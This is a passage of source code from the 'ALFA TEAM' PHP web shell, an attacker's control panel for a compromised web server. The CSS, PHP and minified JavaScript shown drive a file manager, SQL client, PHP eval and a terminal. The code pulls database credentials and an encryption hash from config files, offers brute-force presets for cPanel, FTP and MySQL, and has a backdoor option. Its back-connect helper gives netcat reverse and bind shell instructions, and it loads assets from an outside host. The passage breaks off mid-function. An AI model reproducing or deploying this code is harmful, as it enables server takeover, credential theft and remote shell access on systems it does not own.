div.mysql-query-selected-tab{background:red}table tr.tbl_row:nth-child(odd){background:#424040}.mysql-tables .tables-row{margin-left:26px}.mysql-main .mysql-query-results,.mysql-main .mysql-tables{float:left;height:100%;overflow:auto}.mysql-main .mysql-query-results{width:calc(80% + 4px);margin-left:5px;position:relative;overflow:unset}.mysql-main .mysql-query-results-fixed{width:100%}.mysql-main .mysql-query-results .mysql-query-content{height:89%;overflow:auto}.mysql-query-tab-hide{height:0!important;padding:0!important}.mysql-main .mysql-tables{width:19%;border-right:4px solid #0e304a}.mysql-main table td{vertical-align:top}.mysql-main .mysql-search-area table td{vertical-align:middle;padding:7px}.mysql-tables .block{position:relative;width:1.5em;height:1.5em;min-width:16px;min-height:16px;float:left}.mysql-tables div.block b,.mysql-tables div.block i{width:1.5em;height:1.7em;min-width:16px;min-height:8px;position:absolute;bottom:.7em;left:.75em;z-index:0}.mysql-tables .block i{display:block;border-left:1px solid #666;border-bottom:1px solid #666;position:relative;z-index:0}.mysql-tables .block b{display:block;height:.75em;bottom:0;left:.75em;border-left:1px solid #666}.mysql-tables div.block a,.mysql-tables div.block u{position:absolute;left:50%;top:50%;z-index:10}.mysql-tables div.block img{position:relative;top:-.6em;left:0;margin-left:-7px}.mysql-tables .clearfloat{clear:both}.mysql-tables ul{list-style-type:none;margin-left:0;padding:0}.mysql-tables ul li{white-space:nowrap;clear:both;min-height:16px}.mysql-tables .db_name{margin-left:10px}.mysql-tables .list_container{border-left:1px solid #666;margin-left:.75em;padding-left:.75em}.hide-db-tables{display:none}.mysql-main:after{content:"";display:table;clear:both}table.mysql-data-tbl{border:none!important;border-collapse:collapse!important}table.mysql-data-tbl tr th{padding:5px}table.mysql-data-tbl td{border-left:3px solid #305a8d;border-right:3px solid #305a8d;padding:6px}table.mysql-data-tbl td:first-child{border-left:none}table.mysql-data-tbl td:last-child{border-right:none}.mysql-insert-result,.mysql-structure-qres,.mysql-update-result{display:none;text-align:center;padding:10px;border:1px dashed;margin:22px}#alfa-copyright{margin-top:15px}.ic_b_plus{background-image:url(http://solevisible.com/icons/menu/b_plus.png)}.ic_b_minus{background-image:url(http://solevisible.com/icons/menu/b_minus.png)}
<?php echo '
@keyframes spin {from {transform: rotate(0deg);}to{transform: rotate(360deg);}}
@-webkit-keyframes spin {from {-webkit-transform: rotate(0deg);}to {-webkit-transform: rotate(360deg);}}
@-moz-keyframes spin {from {-moz-transform: rotate(0deg);}to {-moz-transform: rotate(360deg);}}
@-ms-keyframes spin {from {-ms-transform: rotate(0deg);}to {-ms-transform: rotate(360deg);}}
#alfaloader{'.$csscode.'width:100px;height:100px;}
#a_loader img{'.$csscode.'width:150px;height:150px;position:fixed;z-index:999999;top: 31%;left: 45%;}
.ajaxarea{display:none;border:1px solid #0E304A;color:#67ABDF}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:red;width:0;height:8px;display:none;}#hidden_sh{background-color:#0E304A;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(http://solevisible.com/images/alfabg.png);background-position:center;background-attachment:fixed;background-repeat:no-repeat}.header{height:auto;width:auto;border:7px solid #0E304A;color:'.alfa_getColor("header_values").';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#59cc33}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#25ff00;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#0E304A;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:green;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:'.($GLOBALS['DB_NAME']['show_icons']=='1'?'0':'1').'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#0E304A;background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#0E304A;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 7px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:700;clear:both;width:100px;margin-right:-6px;border-right-width:1px;border-right-style:solid;border-right-color:#FFF;padding:3px 15px}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#0E304A;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#0E304A}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url('.__showicon('btn').');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #27979B;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text],input[type=number],.alfa_custom_cmd_btn{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:2px solid #27979B;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #0E304A;background:#000;text-decoration:none;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #27979B;box-shadow:0 0 4px #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
.foottable{width: 300px;font-weight: bold;'.(!@is_writable($GLOBALS['cwd'])?'}.dir{background-color:red;}':'}').'.main th{text-align:left;}.main a{color: #FFF;}.main tr:hover{background-color:#646464 !important;}.ml1{ border:1px solid #0E304A;padding:5px;margin:0;overflow: auto; }.bigarea{ width:99%; height:300px; }.alfa_custom_cmd_btn {padding: 5px;color: #24ff03;cursor: pointer;}.ajaxarea.filesman-active-content {display: block;}'.alfaCssLoadColors().'
</style>';
echo "<script type='text/javascript'>
var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
var a_ = '" . htmlspecialchars(@$_POST['a']) ."';
var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
var islinux = ".($GLOBALS['sys']!="win"?'true':'false').";
var post_encryption_mode = ".(__ALFA_POST_ENCRYPTION__?'true':'false').";";?>
var alfa1_="",alfa2_="",alfa3_="",alfa4_="",alfa5_="",alfa6_="",alfa7_="",alfa8_="",alfa9_="",alfa10_="",d=document,mysql_cache={},editor_files={},editor_error=!0,editor_current_file="",php_temrinal_using_cgi=!1,is_minimized=!1,cgi_is_minimized=!1,options_window_is_minimized=!1,database_window_is_minimized=!1,rightclick_menu_context=null,can_hashchange_work=!0,alfa_can_add_opt=!1,alfa_before_do_action_id="",alfa_ace_editors={editor:null,eval:null},col_dumper_selected_data={},_ALFA_AJAX_={},cgi_lang="",upcount=1,terminal_walk_index=[],alfa_current_fm_id=1,alfa_fm_id=0;function set(e,a,t,i,l,o,r,n,s,c,f,_,u){d.mf.a.value=null!=e?e:a_,d.mf.c.value=null!=a?a:c_,d.mf.alfa1.value=null!=t?t:"",d.mf.alfa2.value=null!=i?i:"",d.mf.alfa3.value=null!=l?l:"",d.mf.alfa4.value=null!=o?o:"",d.mf.alfa5.value=null!=r?r:"",d.mf.alfa6.value=null!=n?n:"",d.mf.alfa7.value=null!=s?s:"",d.mf.alfa8.value=null!=c?c:"",d.mf.alfa9.value=null!=f?f:"",d.mf.alfa10.value=null!=_?_:"",d.mf.charset.value=null!=u?u:charset_}function fc(e){var a=alfa_current_fm_id,t="a="+alfab64("FilesMan")+"&c="+alfab64(e.c.value)+"&alfa1="+alfab64(e.alfa1.value)+"&ajax="+alfab64("true")+"&",i="",l=0;if(d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked&&(l++,i+="f[]="+alfab64(decodeURIComponent(e.value))+"&")}),0==l&&"paste"!=e.alfa1.value)return!1;switch(alfaloader("filesman_holder_"+a,"block"),e.alfa1.value){case"delete":d.querySelectorAll("#filesman_holder_"+a+" .fmanager-row").forEach(function(e){var a=e.querySelector("input[type=checkbox]");a.checked&&".."!=a.value?e.remove():a.checked=!1}),d.querySelector("#filesman_holder_"+a+" .chkbx").checked=!1;break;case"copy":case"move":case"zip":case"unzip":d.querySelectorAll("#filesman_holder_"+a+" input[type=checkbox]:checked").forEach(function(e){e.checked=!1})}_Ajax(d.URL,t+i,function(e){alfaloader("filesman_holder_"+a,"none"),alfaFmngrContextRow()},!1,"filesman_holder_"+a)}function initDir(e){var a="",t="";islinux&&(a="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" path='/' href='#action=fileman&path=/'>/</a>",t="/");var l=e.split("/"),o="",r=islinux?"/":"";for(i in"-1"!=l.indexOf("..")&&(l.splice(l.indexOf("..")-1,1),l.splice(l.indexOf(".."),1)),l)""!=l[i]&&(o+="<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l[i]+'/\' class="header_pwd">'+l[i]+"/</a>",r+=l[i]+"/");$("header_cwd").innerHTML=a+o+" ",alfaInitCwdContext(),l=(l=t+l.join("/")).replace("//","/"),d.footer_form.c.value=l,$("footer_cwd").value=l,c_=l}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(e,a,t,i,l){var o=!1;return window.XMLHttpRequest?o=new XMLHttpRequest:window.ActiveXObject&&(o=new ActiveXObject("Microsoft.XMLHTTP")),void 0!==l&&(_ALFA_AJAX_[l]=o),o?(o.onreadystatechange=function(){4==o.readyState&&200==o.status?"function"==typeof t&&(t(o.responseText,l),alfaClearAjax(l)):4==o.readyState&&200!=o.status&&(alfaAjaxError(o.status,l,o.statusText,o.responseText),alfaClearAjax(l))},o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),void o.send(a)):void alert("Error !")}function alfaClearAjax(e){_ALFA_AJAX_.hasOwnProperty(e)&&delete _ALFA_AJAX_[e]}function handleup(e,a){var t="__fnameup";if(0!=a&&(t="__fnameup"+a),e.files.length>1){for(var i="",l=0;l<e.files.length;l++)i+=e.files[0].name+", ";$(t).innerHTML=i}else e.files[0].name&&($(t).innerHTML=e.files[0].name)}function u(e){var a=!1,t=0,i=alfa_current_fm_id,l=new FormData,o="filesman_holder_"+i;l.append("a",alfab64(e.a.value)),l.append("c",alfab64(e.c.value)),l.append("alfa1",alfab64(e.alfa1.value)),l.append("charset",alfab64(e.charset.value)),l.append("ajax",alfab64(e.ajax.value)),e.querySelectorAll("input[type=file]").forEach(function(e){if(0==e.value.length)return!1;if(e.files.length>1)for(var a=0;a<e.files.length;a++)l.append("f[]",e.files[a]);else l.append("f[]",e.files[0]);t++}),$("footerup").value="",$("__fnameup").innerHTML="";for(var r=1;r<=upcount;r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,0==t)return!1;var s="up_bar_"+getRandom();$("up_bar_holder").insertAdjacentHTML("beforeend","<div id='"+s+"' class='up_bar'></div>");e.c.value;if(window.XMLHttpRequest?a=new XMLHttpRequest:window.ActiveXObject&&(a=new ActiveXObject("Microsoft.XMLHTTP")),a){var c=$(s);_ALFA_AJAX_[s]=a,a.upload&&(c.style.display="block",a.upload.onprogress=function(e){var a=e.position||e.loaded,t=e.totalSize||e.total,i=Math.floor(a/t*1e3)/10+"%";c.style.width=i}),a.onload=function(e){200===a.status?c.style.display="none":alfaAjaxError(a.status,"upload_area",a.statusText,a.responseText),alfaClearAjax(s)},a.onreadystatechange=function(){if(4==a.readyState&&200==a.status){if("noperm"!=a.responseText&&"[]"!=a.responseText){var e,t=JSON.parse(a.responseText),l="",r=d.querySelectorAll("#"+o+" #filemanager_table tr").length-3;for(e in t){++r;var n=t[e].name,s=encodeURIComponent(n),c=t[e].size,f=t[e].perm,_=t[e].modify,u=t[e].owner,p=loadType(n,"file");try{d.querySelector("#"+o+" .fmanager-row a[fname='"+n+"']").parentElement.parentElement.parentElement.remove()}catch(e){}l+='<tr class="fmanager-row" id="tr_row_'+r+'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'+n+'" class="chkbx" id="checkbox'+r+'"><label for="checkbox'+r+'"></label></div></td><td id="td_row_'+r+'">'+p+'<div style="position:relative;display:inline-block;bottom:12px;"><a row="'+r+'" id="id_'+r+'" class="main_name" onclick="editor(\''+s+"','auto','','','','file');\" href=\"#action=fileman&amp;path="+c_+"&amp;file="+s+'" fname="'+n+'" ftype="file" path="'+c_+'" opt_title="">'+n+'</a></div></td><td><span style="font-weight:unset;" class="main_size">'+c+'</span></td><td><span style="font-weight:unset;" class="main_modify">'+_+'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'+u+'</span></td><td><a id="id_chmode_'+r+'" href="javascript:void(0)" onclick="editor(\''+s+"','chmod','','','','file')\">"+f+'</a></td><td><a id="id_rename_'+r+'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'touch','','','','file')\">T</a> <a id=\"id_edit_"+r+'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''+s+"', 'edit','','','','file')\">E</a> <a id=\"id_download_"+r+'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''+n+"', 'download')\">D</a><a id=\"id_delete_"+r+'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '+s+" # ?'); chk ? g('FilesMan',null,'delete', '"+s+"') : '';\"> X </a></td></tr>"}d.querySelector("#"+o+" #filemanager_last_tr").insertAdjacentHTML("beforebegin",l),alfaShowNotification("File(s) uploaded successfully","Uploader"),alfaFmngrContextRow()}else alfaShowNotification("Folder has no permission...","Uploader","error");alfaCheckCurrentFilesManTab(i)}},a.open("POST",d.URL),a.send(l)}}function alfaCheckCurrentFilesManTab(e){-1==$("filesman_tab_"+e).classList.value.indexOf("filesman-tab-active")&&$("filesman_tab_"+e).classList.add("tab-is-done")}function g(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset){var fm_id=0==alfa_fm_id?alfa_current_fm_id:alfa_fm_id,fm_id2=alfa_fm_id,fm_path=null==c||0==c.length?c_:c,d_mf_c=fm_path,g_action_id=alfa_before_do_action_id;0==alfa_fm_id&&(set(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset),d_mf_c=d.mf.c.value),"GetConfig"!=a&&"download"!=alfa2&&islinux&&"/"!=d_mf_c.substr(0,1)&&(d_mf_c="/"+d_mf_c),"FilesMan"==a?(alfaloader("filesman_holder_"+fm_id,"block"),g_action_id="filesman_holder_"+fm_id):""!=g_action_id?alfaloader(g_action_id,"block"):"FilesTools"!=a&&"download"!=alfa2&&"GetConfig"!=a&&("sql"==a?(showEditor("database_window"),g_action_id=loadPopUpDatabase("")):"FilesMan"!=a&&(showEditor("options_window"),g_action_id=loadPopUpOpTions(a)),alfaloader(g_action_id,"block"));for(var data="a="+alfab64(a)+"&c="+alfab64(d_mf_c)+"&",i=1;i<=10;i++)data+="alfa"+i+"="+alfab64(eval("d.mf.alfa"+i+".value"))+"&";if("FilesMan"==a){var pagenum=d.querySelector("#"+g_action_id+" .page-number.active-page-number");null!=pagenum&&(data+="pagenum="+alfab64(getCookie(g_action_id+"_page_number")),setCookie(g_action_id+"_page_number",1,2012))}if(data+="&ajax="+alfab64("true"),"FilesTools"==a&&"download"==alfa2){alfaLoaderOnTop("none");var dl=$("dlForm");return dl.a.value=alfab64("dlfile"),dl.c.value=alfab64(d_mf_c),dl.file.value=alfab64(alfa1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data,function(e,t){evalJS(e);var i=!1;if(alfaLoaderOnTop("none"),"sql"==a)return console.log(t),loadPopUpDatabase(e,t),!1;if("FilesMan"==a){alfaloader("filesman_holder_"+fm_id,"none"),d.querySelector("#filesman_holder_"+fm_id).innerHTML=e,fm_path=fm_path.replace(/\/\//g,"/"),$("filesman_tab_"+fm_id).setAttribute("path",fm_path);var l=alfaGetLastFolderName(fm_path);d.querySelector("#filesman_tab_"+fm_id+" span").innerHTML=l,alfaFmngrContextRow(),"function"==typeof alfa1&&alfa1(e),alfaCheckCurrentFilesManTab(fm_id)}else(options_window_is_minimized||"."==t.substr(0,1))&&"."==t.substr(0,1)&&(i=!0,t=t.substr(1),showEditor("options_window")),i||alfaloader(t,"none"),loadPopUpOpTions(t,e),"phpeval"==a&&alfaLoadAceEditor("PhpCode"),"coldumper"==a.substr(0,9)&&alfaColDumperInit()},!1,""==g_action_id?"."+a:g_action_id),g_action_id="",0==fm_id2&&c!=c_&&c&&initDir(c)):(alfaloader(alfa3,"block"),_Ajax(d.URL,data,function(e,a){var t=a;a=d.querySelector("#"+("id_db"!=a.substr(0,5)?"option_"+a:a));try{(e=JSON.parse(e)).host&&e.user&&e.dbname&&($("db_host")&&(a.querySelector("#db_host").value=e.host),$("db_user")&&(a.querySelector("#db_user").value=e.user),$("db_name")&&(a.querySelector("#db_name").value=e.dbname),$("db_pw")&&(a.querySelector("#db_pw").value=e.password),$("db_prefix")&&e.prefix&&(a.querySelector("#db_prefix").value=e.prefix),$("cc_encryption_hash")&&e.cc_encryption_hash&&(a.querySelector("#cc_encryption_hash").value=e.cc_encryption_hash))}catch(e){}alfaloader(t,"none")},!1,alfa3))}function alfaGetLastFolderName(e){var a=e.replace(/\/\//g,"/").split("/");for(var t in a)0==a[t].length&&a.splice(t,1);var i=a[a.length-1];return 0==i.length&&(i="/"),i}function alfaloader(e,a){if(0==e.length)return!1;try{var t=$("loader_"+e);if(null==t&&"block"==a){var i=null;"editor"==e?i=d.querySelector("#editor .editor-modal"):"id_db"==e.substr(0,5)?i=$(e):"terminal_id"==e.substr(0,11)?i=$(e):"editor"==e.substr(0,6)?i=$(e):"cgiframe"==e?i=$("cgiframe"):"filesman_holder"==e.substr(0,15)?(i=$(e)).style.minHeight="300px":i=$("option_"+e),i.insertAdjacentHTML("afterbegin","<div id='loader_"+e+'\' class="options-loader-holder"><div parent="'+e+'" onclick="alfaAjaxController(this);" class="stopAjax">[ Stop it ]</div><div class="alfateam-loader-text">ALFA TEAM</div><div class="alfa-ajax-error"></div><img src=\'http://solevisible.com/images/loader.svg\'></div>')}else"filesman_holder"==e.substr(0,15)&&($(e).style.minHeight="0"),null!=t&&(t.style.display=a)}catch(e){}}function fs(e){var a=e.getAttribute("db_id"),t=d.querySelector("#"+a+" div.sf");mysql_cache.hasOwnProperty(a)||(mysql_cache[a]={}),alfaloader(a,"block");var i=t.querySelector("input[name=sql_host]").value,l=t.querySelector("input[name=sql_login]").value,o=t.querySelector("input[name=sql_pass]").value,r=t.querySelector("input[name=sql_base]")?t.querySelector("input[name=sql_base]").value:t.querySelector("select[name=sql_base]").value,n=t.querySelector("select[name=type]").value,s=t.querySelector("input[name=sql_count]").checked?"true":"";_Ajax(d.URL,"a="+alfab64("Sql")+"&alfa1="+alfab64("query")+"&alfa2=&c="+alfab64(c_)+"&charset="+alfab64("UTF-8")+"&type="+alfab64(n)+"&sql_host="+alfab64(i)+"&sql_login="+alfab64(l)+"&sql_pass="+alfab64(o)+"&sql_base="+alfab64(r)+"&sql_count="+alfab64(s)+"&current_mysql_id="+alfab64(a)+"&ajax="+alfab64("true"),function(e,a){loadPopUpDatabase(e,a),evalJS(e),alfaloader(a,"none")},!1,a)}function ctlbc(e){var a=$("bcStatus"),t=$("bcipAction");"bind"==e.value?(t.style.display="none",a.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(t.style.display="inline-block",a.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function $(e){return d.getElementById(e)}function addnewup(){var e="footerup_"+upcount,a="pfooterup_"+upcount,t=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",i=d.createElement("p");i.innerHTML='<label class="inputfile" for="'+e+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="'+e+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');" multiple>',i.id=a,i.appendAfter($(t)),upcount++}function alfa_searcher_tool(e){switch(e){case"all":case"dirs":_alfaSet(!0,"Disabled");break;case"files":_alfaSet(!1,"php")}}function _alfaSet(e,a){d.srch.ext.disabled=e,d.srch.ext.value=a}function dis_input(e){switch(e){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(e,a,t){c="21"!=a?"localhost":"ftp.example.com",$("port").disabled=e,$("port").value=a,$("target").value=c,$("protocol").value=t}function inBackdoor(e){"my"==e.value?$("backdoor_textarea").style.display="block":$("backdoor_textarea").style.display="none"}function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}function alfaAjaxError(e,a,t,i){if(void 0!==a){var l=d.querySelector("#loader_"+a);null!=l&&(firewall="",403==e&&(firewall=" ~ FireWall Detected!"),l.querySelector("img").remove(),l.querySelector(".alfa-ajax-error").innerHTML=e+" ( "+t+firewall+" )",alfaShowNotification(t,"Ajax","error"))}}function alfaInitCwdContext(){d.querySelectorAll(".header_pwd").forEach(function(e){e.addEventListener("contextmenu",function(e){var a=e.target.getAttribute("path"),t=d.querySelector("#rightclick_menu > a[name=newtab]");t.setAttribute("href","javascript:void(0);"),t.removeAttribute("target"),t.onclick=function(){alfaFilesManNewTab(a,"/")};var i=e.clientX,l=e.clientY;alfaSortMenuItems(["newtab"]),alfaRightClickMenu(i,l),e.preventDefault()})})}function alfaRightClickMenu(e,a){rightclick_menu_context.top=a+"px",rightclick_menu_context.left=e+"px",rightclick_menu_context.visibility="visible",rightclick_menu_context.opacity="1"}function alfaSortMenuItems(e){var a=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete","view_archive"],t=!1;for(var i in a){for(var l in t=!1,e)a[i]!=e[l]||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="block",t=!0);t||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="none")}}function alfaAceChangeSetting(e,a){var t=e.options[e.selectedIndex].value,i=e.getAttribute("base"),l=alfa_ace_editors.editor;"eval"==i&&(l=alfa_ace_editors.eval);var o=e.getAttribute("ace_id");"lang"==a?l[o].session.setMode("ace/mode/"+t):"theme"==a&&l[o].setTheme("ace/theme/"+t),setCookie("alfa_ace_"+a+"_"+i,t,2012)}function alfaAceChangeWrapMode(e,a){var t=alfa_ace_editors.editor;"eval"==a&&(t=alfa_ace_editors.eval);var i=e.getAttribute("ace_id");e.checked?t[i].session.setUseWrapMode(!0):t[i].session.setUseWrapMode(!1)}function alfaAceChangeFontSize(e,a,t){var i=alfa_ace_editors.editor;"eval"==e&&(i=alfa_ace_editors.eval);var l=t.getAttribute("ace_id"),o=i[l].getFontSize();"+"==a?++o:--o,i[l].setFontSize(o),setCookie("alfa_ace_fontsize_"+e,o,2012)}function setCookie(e,a,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3);var l="expires="+i.toUTCString();document.cookie=e+"="+a+";"+l+";path=/"}function getCookie(e){var a=("; "+document.cookie).split("; "+e+"=");if(2==a.length)return a.pop().split(";").shift()}function editorClose(e){if(d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e){if(is_minimized=!1,null!=alfa_ace_editors.editor&&null!=alfa_ace_editors.editor){for(var a in alfa_ace_editors.editor)alfa_ace_editors.editor[a].destroy();alfa_ace_editors.editor=null,d.querySelector(".editor-tabs").innerHTML="",d.querySelector(".editor-content-holder").innerHTML=""}}else if("cgiloader"==e)php_temrinal_using_cgi&&(d.querySelector(".terminal-tabs").innerHTML="",d.querySelector(".terminal-contents").innerHTML=""),php_temrinal_using_cgi=!1,cgi_is_minimized=!1;else if("options_window"==e){if(options_window_is_minimized=!1,null!=alfa_ace_editors.eval){for(var a in alfa_ace_editors.eval)alfa_ace_editors.eval[a].destroy();alfa_ace_editors.eval=null,d.querySelectorAll(".php-evals").forEach(function(e){e.removeAttribute("ace")})}}else"database_window"==e&&(database_window_is_minimized=!1);setTimeout(function(){elem=$(e),elem.removeAttribute("class"),elem.style.display="none","options_window"==e&&(elem.querySelector(".options_tab").innerHTML="",elem.querySelector(".options_content").innerHTML="")},1e3),d.body.style.overflow="visible"}function popupWindowBackPosition(){var e={cgiloader:cgi_is_minimized,options_window:options_window_is_minimized,database_window:database_window_is_minimized,editor:is_minimized},a=[];for(var t in e)e[t]&&a.push(t);1==a.length?$(a[0]+"-minimized").style.top="30%":2==a.length?($(a[0]+"-minimized").style.top="20%",$(a[1]+"-minimized").style.top="50%"):3==a.length?($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="60%"):4==a.length&&($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="55%",$(a[3]+"-minimized").style.top="80%")}function showEditor(e){if($(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e)is_minimized=!1;else if("cgiloader"==e)cgi_is_minimized=!1;else if("options_window"==e){options_window_is_minimized=!1;var a=d.querySelector("#options_window .content_options_holder .options_tab 